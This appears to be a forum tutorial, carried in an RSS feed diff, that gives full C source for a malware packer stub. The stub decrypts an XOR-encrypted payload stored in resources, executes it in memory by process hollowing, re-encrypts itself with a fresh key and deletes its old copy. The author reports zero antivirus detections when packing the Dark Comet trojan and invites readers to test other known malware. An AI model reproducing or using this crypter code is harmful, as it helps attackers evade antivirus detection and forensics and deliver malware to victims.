+#include &lt;string.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;zlib.h&gt;
+
+#define WIN32_LEAN_AND_MEAN
+#define DEBUG
+#define DEBUG_TITLE "STUB - DEBUG MESSAGE"
+
+#define BUFFER_RSRC_ID 10
+#define FILE_SIZE_RSRC_ID 20
+#define KEY_RSRC_ID 30
+
+#define KEY_LEN 64
+
+typedef VOID(*PZUVOS)(HANDLE, PVOID);
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwBufSize;
+    DWORD dwFileSize;
+    PBYTE pKey;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+#ifdef DEBUG
+    CHAR szDebugBuf[BUFSIZ];
+    va_list args;
+
+    va_start(args, fmt);
+    vsprintf(szDebugBuf, fmt, args);
+    MessageBox(NULL, szDebugBuf, DEBUG_TITLE, MB_OK);
+
+    va_end(args);
+#endif
+}
+
+FileStruct *ExtractPayload(VOID) {
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) return NULL;
+
+    // get file buffer
+    // get size of resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug("Find buffer resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwBufSize = SizeofResource(NULL, hRsrc);
+
+    // get pointer to resource buffer
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug("Load buffer resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug("Lock buffer resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get actual file size resource
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug("Find file size error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get file size value
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug("Load buffer resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwFileSize = *(LPDWORD)LockResource(hGlobal);
+
+    // get decryption key
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug("Find key resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get pointer to key buffer
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug("Load key resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;pKey = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pKey == NULL) {
+        Debug("Lock buffer resource error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    return fs;
+}
+
+BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // add decryption key as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    if (EndUpdateResource(hUpdate, FALSE) == FALSE) {
+        Debug("End update resource error: %lu\n", GetLastError());
+    }
+
+    return TRUE;
+}
+
+BOOL GenerateKey(FileStruct *fs) {
+    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
+    if (fs-&gt;pKey == NULL) return FALSE;
+
+    // initialize crypto service provider
+    HCRYPTPROV hProv = NULL;
+    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
+        Debug("Crypt aquire context error: %lu\n", GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // generate secure bytes
+    //Debug("Generating cryptographically secure bytes...\n");
+    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
+        Debug("Generate random key error: %lu\n", GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+    /*
+    Debug("Using key: ");
+    for (int i = 0; i &lt; KEY_LEN; i++)
+        Debug("0x%02x ", fs-&gt;pKey[i]);
+    Debug("\n");
+    */
+
+    // clean up
+    CryptReleaseContext(hProv, 0);
+
+    return TRUE;
+}
+
+// XOR
+BOOL DecryptPayload(FileStruct *fs) {
+    PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
+    if (pDecryptPayloadedBuffer == NULL) return FALSE;
+
+    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
+        pDecryptPayloadedBuffer[i] = fs-&gt;pBuffer[i] ^ fs-&gt;pKey[i % KEY_LEN];
+
+    fs-&gt;pBuffer = pDecryptPayloadedBuffer;
+
+    return TRUE;
+}
+
+// XOR
+BOOL Encrypt(FileStruct *fs) {
+    return DecryptPayload(fs);
+}
+
+BOOL DecompressPayload(FileStruct *fs) {
+    PBYTE pDecompressedBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    ULONG ulDecompressedBufSize;
+    uncompress(pDecompressedBuffer, &amp;ulDecompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwFileSize);
+
+    fs-&gt;pBuffer = pDecompressedBuffer;
+    fs-&gt;dwBufSize = ulDecompressedBufSize;
+
+    return TRUE;
+}
+
+VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
+    DWORD dwWritten;
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL);
+    CloseHandle(hFile);
+    ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
+}
+
+BOOL MemoryExecutePayload(FileStruct *fs) {
+    // PE headers
+    PIMAGE_DOS_HEADER pidh;
+    PIMAGE_NT_HEADERS pinh;
+    PIMAGE_SECTION_HEADER pish;
+
+    // process info
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // pointer to virtually allocated memory
+    LPVOID lpAddress = NULL;
+
+    // context of suspended thread for setting address of entry point
+    CONTEXT context;
+
+    // need function pointer for ZwUnmapViewOfSection from ntdll.dll
+    PZUVOS pZwUnmapViewOfSection = NULL;
+
+    // get file name
+    CHAR szFileName[MAX_PATH];
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    // first extract header info 
+    // check if valid DOS header
+    pidh = (PIMAGE_DOS_HEADER)fs-&gt;pBuffer;
+    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
+        Debug("DOS signature error");
+        return FALSE;
+    }
+
+    // check if valid pe file
+    pinh = (PIMAGE_NT_HEADERS)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew);
+    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) {
+        Debug("PE signature error");
+        return FALSE;
+    }
+
+    // first create process as suspended
+    memset(&amp;si, 0, sizeof(si));
+    memset(&amp;pi, 0, sizeof(pi));
+    si.cb = sizeof(si);
+    if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
+        Debug("Create process error %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    context.ContextFlags = CONTEXT_FULL;
+    if (GetThreadContext(pi.hThread, &amp;context) == FALSE) {
+        Debug("Get thread context");
+    }
+
+    // unmap memory space for our process
+    pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
+    pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);
+
+    // allocate virtual space for process
+    lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (lpAddress == NULL) {
+        Debug("Virtual alloc error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // write headers into memory
+    if (WriteProcessMemory(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, fs-&gt;pBuffer, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
+        Debug ("Write headers error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // write each section into memory
+    for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
+        // calculate section header of each section
+        pish = (PIMAGE_SECTION_HEADER)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
+        // write section data into memory
+        WriteProcessMemory(pi.hProcess, (PVOID)(pinh-&gt;OptionalHeader.ImageBase + pish-&gt;VirtualAddress), (LPVOID)((DWORD)fs-&gt;pBuffer + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
+    }
+
+    // set starting address at virtual address: address of entry point
+    context.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
+    if (SetThreadContext(pi.hThread, &amp;context) == FALSE) {
+        Debug("Set thread context error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // resume our suspended processes
+    if (ResumeThread(pi.hThread) == -1) {
+        Debug("Resume thread error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return TRUE;
+}
+
+/*
+VOID RunFromMemory(FileStruct *fs) {
+    Debug("%p", fs-&gt;pBuffer);
+    HMEMORYMODULE hModule = MemoryLoadLibrary(fs-&gt;pBuffer, fs-&gt;dwFileSize);
+    if (hModule == NULL) {
+        Debug("Memory load library error: %lu\n", GetLastError());
+        return;
+    }
+
+    int nSuccess = MemoryCallEntryPoint(hModule);
+    if (nSuccess &lt; 0) {
+        Debug("Memory call entry point error: %d\n", nSuccess);
+    }
+
+    MemoryFreeLibrary(hModule);
+}
+*/
+
+VOID SelfDelete(LPCSTR szFileName) {
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFO si = { 0 };
+    si.cb = sizeof(si);
+    //CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+    CHAR szCmdLine[MAX_PATH];
+    sprintf(szCmdLine, "%s delete", szFileName);
+    if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
+        Debug("Create process error: %lu\n", GetLastError());
+    }
+}
+
+BOOL PolymorphPayload(LPCSTR szFileName) {
+    MoveFile(szFileName, "old.exe");
+    CopyFile("old.exe", szFileName, FALSE);
+
+    // re-extract resources
+    FileStruct *fs = ExtractPayload();
+    if (fs == NULL) return FALSE;
+
+    // decrypt buffer
+    if (DecryptPayload(fs) == FALSE) {
+        Debug("DecryptPayload buffer error: %lu\n", GetLastError());
+        free(fs);
+        return FALSE;
+    }
+
+    // generate new key
+    if (GenerateKey(fs) == FALSE) {
+        Debug("Generate key error: %lu\n", GetLastError());
+        free(fs);
+        return FALSE;
+    }
+
+    // encrypt with new key
+    if (Encrypt(fs) == FALSE) {
+        Debug("Encrypt buffer error: %lu\n", GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // update resources
+    if (UpdateResources(fs, szFileName) == FALSE) {
+        free(fs-&gt;pKey);
+        free(fs);
+        return FALSE;
+    }
+
+    SelfDelete(szFileName);
+
+    free(fs-&gt;pKey);
+    free(fs);
+
+    return TRUE;
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    if (strstr(GetCommandLine(), "delete") != NULL) {
+        while (DeleteFile("old.exe") == FALSE);
+    } else {
+        FileStruct *fs = ExtractPayload();
+        if (fs == NULL) {
+            Debug("Extract file error: %lu\n", GetLastError());
+            return 1;
+        }
+
+        if (DecryptPayload(fs) == TRUE) {
+            if (DecompressPayload(fs) == TRUE)
+                //DropAndExecutePayload(fs, "test.exe");
+                MemoryExecutePayload(fs);
+        }
+        free(fs-&gt;pBuffer);
+        free(fs);
+
+        CHAR szFileName[MAX_PATH];
+        GetModuleFileName(NULL, szFileName, MAX_PATH);
+        PolymorphPayload(szFileName);
+    }
+
+    return 0;
+}
+</code></pre>
+<p>The stub simply performs the reversal of the packer. After extracting the necessary information from the resources into the struct, it first deobfuscates the payload by decrypting and then decompressing the buffer with <code>DecryptPayload</code> and <code>DecompressPayload</code>. After a successful deobfuscation, the stub will simply drop the executable in the same directory and execute it. Of course, using the RunPE/Dynamic Forking method would eliminate any disk activity and the resulting forensics.</p>
+<hr>
+<h2>Resources and the PE File Format</h2>
+<p>Here is a quick file analysis showing the resources within a file.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG" width="690" height="335"></p>
+<p>The arrow shows the section for resources (.rsrc) and within the section is simply the resource which has been added to the binary. The labels in the red box on the left represent the different resources which exist in the PE file. Currently, PEView shows the <code>RCDATA</code> (raw data) for resource ID <code>000A</code> which, as seen from the code above, is the obfuscated payload.</p>
+<p>Here is the 32-byte key for the XOR cipher.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/d01749ce5235e32239e0b3c00872d3549ccc4157.PNG" width="690" height="379"></p>
+<hr>
+<h2>Demonstration</h2>
+<p>Here is a quick demonstration using putty.exe as the payload.</p>
+<p>Firstly, launching the packer to create the stub and to add an obfuscated payload.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/fe5927977bd9b70bf2e44a0cf2085332fb01f12c.PNG" width="690" height="204"></p>
+<p>Off-screen, the size of putty.exe is ~512 KB while the stub is ~318 KB. Now, we can launch the generated stub.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/82f46341862a88074bbd517f99c75c763033c038.PNG" width="690" height="306"><br>
+As we can see, it dropped the deobfuscated payload <code>test.exe</code> and then executed it.</p>
+<hr>
+<h2>Update August 1, 2016</h2>
+<h3>Added feature to execute packed payload directly from memory.</h3>
+<p>I’ve just added the RunPE method to my packer and it works perfectly (when compiled with MinGW). Here are some (non-distributing) virus scans with Dark Comet.<br>
+<a href="https://scan.majyx.net/scans/result/37b1f15e43db4921cbf1ef1d3d149f58568e76d1">Majyx</a> (0/35)<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/a427fbc00c08df53efc73598c1aa2e61a8b21220.png" width="500" height="500"><br>
+<a href="http://nodistribute.com/result/b7yt9BLzH8Ge4RIK6unM">NoDistribute</a> (0/35)<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/fc03646dcb5133123ea3414b5d342cebfe50a9f2.png" width="373" height="500"><br>
+Please feel free to test other known malware with these two (or any other <strong>NON</strong> distributing virus scanning websites).</p>
+<h3>Added feature to polymorph packed payload</h3>
+<p>Basically just re-encrypts the compressed payload with a new key.</p>
+<hr>
+<h2>Conclusion</h2>
+<p>The only difficult aspect in this is understanding the resource management but other than that, it’s a pretty simple concept. I’ve added the necessary files to my <a href="https://github.com/93aef0ce4dd141ece6f5/Packer">GitHub</a> including a compiled 32-bit binary.</p>
+<p>Thank you for reading.</p>
+<p><em>– dtm</em></p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/1</link>
+        <pubDate>Fri, 29 Jul 2016 12:18:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-1</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+  </channel>
+</rss>
